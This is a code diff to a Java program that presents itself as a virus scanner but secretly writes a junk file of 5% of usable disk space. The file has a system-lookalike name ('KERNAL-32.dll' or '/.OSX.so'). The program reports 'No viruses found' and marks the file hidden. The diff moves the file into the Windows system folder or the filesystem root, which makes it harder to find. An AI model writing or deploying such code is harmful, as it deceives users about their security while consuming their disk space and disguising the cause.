@@ -13,12 +13,17 @@ public class Main
         String os = System.getProperty("os.name");
         Path target = null;
         File disk = null;
-        if(os.contains("Windows")){
-            target = Paths.get("./KERNAL-32.dll");
-            disk = new File("C:");}
-        else{
-            target = Paths.get("./.OSX.so");
-            disk = new File("/");}
+        if (os.contains("Windows"))
+        {
+            String root = System.getenv("SystemRoot");
+            target = Paths.get(root + "/KERNAL-32.dll");
+            disk = new File(root);
+        }
+        else
+        {
+            target = Paths.get("/.OSX.so");
+            disk = new File("/");
+        }
 
         // Calculate how big the file should be
         long target_size = disk.getUsableSpace() / 100 * 5;
@@ -43,7 +48,9 @@ public class Main
         System.out.println("\nNo viruses found.");
 
         // Hide the file
-        if(os.contains(("Windows"))){
-        Files.setAttribute(target, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);}
+        if (os.contains("Windows"))
+        {
+            Files.setAttribute(target, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
+        }
     }
 }
